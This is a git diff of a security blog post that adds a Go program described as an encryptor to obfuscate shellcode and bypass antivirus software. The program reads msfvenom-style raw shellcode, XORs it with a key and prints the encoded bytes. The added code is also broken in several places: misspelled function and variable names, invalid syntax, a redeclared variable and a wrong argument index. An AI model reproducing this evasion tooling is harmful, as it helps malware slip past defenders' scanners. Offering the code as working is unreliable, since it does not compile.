@@ -101,9 +101,60 @@ For some reason msfvenom used shikata_ga_nai, but i didnt specify to use it whic
 
 ![VirusTotal Screenshot](https://github.com/calloczero/calloczero.github.io/blob/main/_images/crop.png?raw=true)
 
-# Writing an Encryptor to make an obfucate and outplaying Antivirus Software    
+# Writing an Encryptor to obfucate and bypass Antivirus-Software    
+```go 
+package main /* package declaration */
+import (
+	"io/ioutil"
+	"strconv"
+	"fmt"
+	"os"
+	)
+
+/* read bytes raw bytes */
+func ReadBytes(filepath string) (fbytes []byte) {
+	fbytes, err := ioutil.Readfile(filpath)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[*]Could not read file\n")
+	}
+	return 
+}
+
+/* xor bytes */
+func XorBytes(data byte[]), key byte) []byte {
+	for i, v := range data {
+		data[i] = v ^ key
+	}
+	return data
+}
+
+func PrintByteArray(data []byte) {
+	for i, v := range data {
+		if i%15 == 0 && i != 0 {
+			fmt.Println("")
+		}
+		fmt.Printf("\\x%x", v)
+	}
+	fmt.Println("")
+}
+
+func main() {		
+	/* check if commandline arguments given */
+	if len(os.Args) < 3 {
+		fmt.Fprintf(os.Stderr, "[*]Usage: <raw.txt> <key>\n")
+	}
+	
+	/* read shellcode */
+	fbytes := ReadBytes(os.Args[1]) 
+	
+	/* encode bytes */
+	fbytes := XorBytes(fbytes, strconv.Atoi(os.Args[3]))
 
 
+}
+
+
+```
 
 
 
